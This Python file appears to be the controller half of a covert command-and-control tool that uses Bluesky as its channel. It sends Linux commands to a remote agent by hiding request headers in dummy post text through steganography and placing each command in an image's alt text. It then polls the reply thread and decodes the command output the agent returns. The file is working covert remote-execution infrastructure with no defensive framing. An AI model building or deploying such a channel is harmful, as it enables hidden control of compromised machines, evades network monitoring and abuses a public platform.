import time
import sys
import os
import secrets

from dotenv import load_dotenv

from core.bsky_client import BskyClient, MyPost  # Import the BskyClient class from your script
from core.text_stegano import TextStegano
from core.header_serializer import HeaderSerializer
from core.data_serializer import DataSerializer
from core.text_generator import TextGenerator
from core.dummy_text_generator import DummyTextGenerator
from core.image_path_generator import ImagePathGenerator
from core.dummy_image_path_generator import DummyImagePathGenerator
from core.image_processor import ImageProcessor

class Controller:
    def __init__(self, bsky_client: BskyClient, text_generator: TextGenerator, image_path_generator: ImagePathGenerator, timeout: int = 180, debug: bool = False):
        self.client = bsky_client
        self.text_generator = text_generator
        self.image_path_generator = image_path_generator
        
        self.timeout = timeout  # Timeout in seconds
        self.interval = 1
        self.debug = debug
        
        self.service_responses = [
            "COMMAND-FAILED",
            "NO-CONTENT"
        ]

    def request(self, command: str) -> str:
        """
        Sends a request with the provided Linux command and processes the responses.

        Parameters:
        command (str): The Linux command to execute.
        """
        try:
            # Step 1: Generate request header and data
            req_id = secrets.token_urlsafe(8)
            req_header = HeaderSerializer.serialize(
                id=req_id,
                type="req",
                curr_post=1,
                total_posts=1
            )
            dummy_text = self.text_generator.generate()
            encoded_header = TextStegano.encode(dummy_text, req_header)
            if len(command) > 2000:
                raise Exception("Command exceeds 2000 characters")
            req_data = DataSerializer.serialize_string(command, 2000)

            # Step 2: Create a new post with the encoded header and data
            image_path = self.image_path_generator.generate()
            ImageProcessor.compress_bsky(image_path, "./tmp.jpg", 500)
            post = self.client.create_post(
                text=encoded_header,
                image_path="./tmp.jpg",
                image_alt=req_data[0]  # Assuming single part for the command
            )
            if self.debug: print(f"Request sent: Post URI: {post.uri}")

            # Step 3: Periodically check for replies
            replies = []
            start_time = time.time()
            while True:
                # timeout
                if time.time() - start_time > self.timeout:
                    raise TimeoutError("Timeout: Full response not received within the specified time.")

                # fetch replies
                thread = self.client.read_thread(post.uri, 1000, 1000)
                
                # check if all replies received
                if len(thread) > 0:
                    decoded_header = TextStegano.decode(thread[-1].text)
                    res_header = HeaderSerializer.deserialize(decoded_header)
                    if res_header["curr_post"] == res_header["total_posts"]:
                        replies = thread
                        break
                    
                time.sleep(self.interval)
                
            # Step 4: Decode all headers and gather data
            responses = []
            for reply in replies:
                try:
                    decoded_header = TextStegano.decode(reply.text)
                    res_header = HeaderSerializer.deserialize(decoded_header)

                    if res_header["id"] == req_id and res_header["type"] == "res":
                        responses.append(reply.image_alt)
                except Exception as e:
                    if self.debug: print(f"Error processing reply: {e}")

            # Step 5: Deserialize and print the complete response
            full_response = DataSerializer.deserialize_string(responses)
            if self.debug: print("########## OUTPUT ###########")
            if self.debug: print(full_response)
            if self.debug: print("#############################")
            
            if full_response in self.service_responses:
                full_response = ""
            
            print(full_response)
            
            return full_response

        except Exception as e:
            if self.debug: print(f"Error in request method: {e}")

if __name__ == "__main__":
    # Load environment variables
    load_dotenv()
    
    handle = os.getenv("BSKY_LOGIN")
    password = os.getenv("BSKY_PASSWORD")
    did = os.getenv("BSKY_DID")
    
    # Check for command-line arguments
    if len(sys.argv) < 2:
        print("Controller: usage: python3 controller.py '<command>' [-v] [-t <timeout_seconds>]")
        sys.exit(1)
    
    command = sys.argv[1]
    verbose = "-v" in sys.argv

    # Default timeout
    timeout = 180

    # Check for timeout argument  
    if "-t" in sys.argv:
        try:
            timeout_index = sys.argv.index("-t")
            timeout = int(sys.argv[timeout_index + 1])
        except (ValueError, IndexError):
            print("Controller: invalid timeout value. Usage: -t <timeout_seconds>")
            sys.exit(1)

    # Initialize objects
    bsky_client = BskyClient(handle, password, did)
    text_generator = DummyTextGenerator()
    image_path_generator = DummyImagePathGenerator("image_db")
    
    # Execute the controller request
    controller = Controller(bsky_client, text_generator, image_path_generator, timeout=timeout, debug=verbose)
    controller.request(command)
